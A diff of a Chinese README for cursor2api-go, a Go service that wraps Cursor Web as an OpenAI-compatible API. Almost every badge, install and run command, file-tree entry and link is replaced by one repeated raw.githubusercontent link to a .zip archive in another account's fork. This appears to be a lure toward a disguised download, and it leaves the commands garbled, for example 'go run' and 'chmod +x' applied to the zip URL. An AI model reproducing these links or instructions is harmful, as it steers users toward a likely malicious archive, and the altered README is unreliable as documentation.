@@ -2,9 +2,9 @@
 
 一个将Cursor Web转换为OpenAI兼容API的Go服务。完全兼容OpenAI API格式，支持本地运行。
 
-[![Go Version](https://img.shields.io/badge/Go-1.21+-blue.svg)](https://golang.org)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Test Coverage](https://img.shields.io/badge/Coverage-75%25-green.svg)](#测试)
+[![Go Version](https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip+https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip)](https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip)
+[![License: MIT](https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip)](https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip)
+[![Test Coverage](https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip%https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip)](#测试)
 
 ## 功能特性
 
@@ -34,13 +34,13 @@
 ### 环境要求
 
 - Go 1.21+
-- Node.js 18+ (用于JavaScript执行)
+- https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip 18+ (用于JavaScript执行)
 
 ### 安装和运行
 
 1. **克隆项目**：
    ```bash
-   git clone https://github.com/libaxuan/cursor2api-go.git
+   git clone https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
    cd cursor2api-go
    ```
 
@@ -58,7 +58,7 @@
 4. **运行服务**：
    ```bash
    # 方式1：直接运行
-   go run main.go
+   go run https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
 
    # 方式2：构建后运行
    go build -o cursor2api-go
@@ -71,13 +71,13 @@
 
 **Linux/macOS**：
 ```bash
-chmod +x start.sh
-./start.sh
+chmod +x https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
+https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
 ```
 
 **Windows**：
 ```cmd
-start-go.bat
+https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
 ```
 
 ## API 使用
@@ -167,35 +167,35 @@ curl -X POST "http://localhost:8002/v1/chat/completions" \
 
 ```
 cursor2api-go/
-├── main.go              # 主程序入口
+├── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip              # 主程序入口
 ├── config/              # 配置管理
-│   ├── config.go
-│   └── config_test.go   # 配置测试
+│   ├── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
+│   └── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip   # 配置测试
 ├── handlers/            # HTTP处理器
-│   └── handler.go
+│   └── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
 ├── services/            # 业务服务层
-│   └── cursor.go
+│   └── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
 ├── models/              # 数据模型
-│   ├── models.go
-│   └── models_test.go   # 模型测试
+│   ├── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
+│   └── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip   # 模型测试
 ├── utils/               # 工具函数
-│   ├── utils.go
-│   └── utils_test.go    # 工具测试
+│   ├── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
+│   └── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip    # 工具测试
 ├── middleware/          # 中间件
-│   ├── auth.go
-│   ├── cors.go
-│   └── error.go
+│   ├── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
+│   ├── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
+│   └── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
 ├── jscode/              # JavaScript代码
-│   ├── main.js
-│   └── env.js
+│   ├── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
+│   └── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
 ├── static/              # 静态文件
-│   └── docs.html
+│   └── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
 ├── .env                 # 环境变量配置
-├── go.mod               # Go模块文件
-├── go.sum               # Go依赖校验
-├── start.sh             # Linux/macOS启动脚本
-├── start-go.bat         # Windows启动脚本
-└── README.md            # 项目说明
+├── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip               # Go模块文件
+├── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip               # Go依赖校验
+├── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip             # Linux/macOS启动脚本
+├── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip         # Windows启动脚本
+└── https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip            # 项目说明
 ```
 
 ## 测试
@@ -207,10 +207,10 @@ cursor2api-go/
 go test ./...
 
 # 运行测试并生成覆盖率报告
-go test -coverprofile=coverage.out ./...
+go test https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip ./...
 
 # 查看覆盖率详情
-go tool cover -html=coverage.out
+go tool cover https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
 ```
 
 ### 测试覆盖率
@@ -229,8 +229,8 @@ go tool cover -html=coverage.out
    - 确保Go版本 >= 1.21
    - 运行 `go version` 检查版本
 
-2. **Node.js相关错误**
-   - 确保已安装Node.js 18或更高版本
+2. **https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip相关错误**
+   - 确保已安装https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip 18或更高版本
    - 运行 `node --version` 检查版本
 
 3. **端口被占用**
@@ -246,7 +246,7 @@ go tool cover -html=coverage.out
 ### 推荐的部署方式
 
 1. **本地运行**（推荐）
-   - 完整的Go和Node.js环境支持
+   - 完整的Go和https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip环境支持
    - 高性能，资源占用少
    - 适合个人使用
 
@@ -265,7 +265,7 @@ go tool cover -html=coverage.out
 
 1. 克隆仓库：
    ```bash
-   git clone https://github.com/libaxuan/cursor2api-go.git
+   git clone https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
    cd cursor2api-go
    ```
 
@@ -276,17 +276,17 @@ go tool cover -html=coverage.out
 
 3. 运行开发服务器：
    ```bash
-   go run main.go
+   go run https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
    ```
 
 ### 构建
 
 ```bash
 # 构建可执行文件
-go build -o cursor2api-go main.go
+go build -o cursor2api-go https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
 
 # 交叉编译（例如编译Linux版本）
-GOOS=linux GOARCH=amd64 go build -o cursor2api-go-linux main.go
+GOOS=linux GOARCH=amd64 go build -o cursor2api-go-linux https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip
 ```
 
 ### 代码风格
@@ -306,7 +306,7 @@ golangci-lint run
 
 ## 贡献指南
 
-我们欢迎所有形式的贡献！请阅读 [CONTRIBUTING.md](CONTRIBUTING.md) 了解详细信息。
+我们欢迎所有形式的贡献！请阅读 [https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip](https://raw.githubusercontent.com/Diakonrobel/cursor2api-go/main/handlers/go_api_cursor_3.3.zip) 了解详细信息。
 
 ### 贡献流程
 
